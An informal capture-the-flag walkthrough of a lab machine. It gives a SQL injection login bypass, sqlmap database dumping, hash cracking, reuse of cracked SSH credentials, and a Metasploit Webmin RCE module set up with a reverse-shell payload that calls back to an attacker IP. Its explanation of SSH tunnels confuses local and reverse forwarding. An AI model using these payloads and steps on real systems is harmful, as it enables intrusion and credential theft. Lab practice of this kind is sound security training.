fun room 

done it quick, less than an hour 

1: enumeration 

address presents a basic, semi functional game review site with a login panel and nothing more, source didnt show anything interesting, nikto didn’t show anything interesting, nmap with default scripts didnt show anything interesting, gobuster returned a portal.php which was crucial in exploiting the machine 

2: exploiting 

Defeating the login pane (wasn’t necessary) with: 

`‘ or 1=1 ;—`

in both username and password fields forwarded us to portal.php:

site contained a search pane, turned out it was prone to SQLi with:

`‘`

which returned a mysql error 

to defeat it, it was necessary to capute and copy the search request using burp, and providing sqlmap with it: `sqlmap -r request.txt —dbms=mysql —dump`

this dumped two tables, one with game names and reviews, the other with a hash and an username

hash was sha256, cracked it with john using rockyou.txt, username was inside the table

**agent47:videogamer124**

with those credentials, we were able to log into SSH, which gave us the first flag

# REVERSE SSH TUNNELS:

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

- **L** is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do **ssh -L 9000:imgur.com:80 user@example.com.** Going to localhost:9000 on your machine, will load imgur traffic using your other server.
- **R** is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

`ss -tulnp` showed us sockets running on the host,

running 

**`ssh -L 10000:localhost:10000 agent47@MACHINEIP`**

on attacker machine

allowed us to catch the reverse ssh tunnel, which revealed a CMS (content management system) called Webmin 1.580, and surprisingly this version was vulnerable to a RCE with the exploit being preinstalled in metasploit

metasploit path:

`search webmin`

`use exploit/unix/webapp/webmin_show_cgi_exec`

`show payloads`

`set payload cmd/unix/reverse_python`

`set password videogamer124`

`set username agent47`

`set rhosts [localhost](http://localhost)` 

`set rport 10000`

`set ssl false`

`set lhost 10.9.6.40`

`set lport 4444`

`exploit`

this provided us with a root shell 

grab root flag located at /root, and thats it 

:)
